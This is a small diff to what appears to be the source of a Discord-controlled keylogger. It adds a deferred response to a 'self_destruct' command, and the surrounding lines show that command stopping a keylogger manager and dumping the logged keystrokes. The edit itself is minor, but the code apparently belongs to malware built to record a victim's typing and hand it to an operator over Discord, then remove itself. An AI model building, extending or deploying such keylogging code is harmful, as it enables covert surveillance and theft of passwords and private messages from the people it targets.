@@ -511,6 +511,7 @@ async def self_destruct(interaction: discord.Interaction):
         """
         Triggers the self-destruct sequence.
         """
+        await interaction.response.defer(thinking=True)
 
         log_data_json = keylogger_manager.stopAndDump()
     
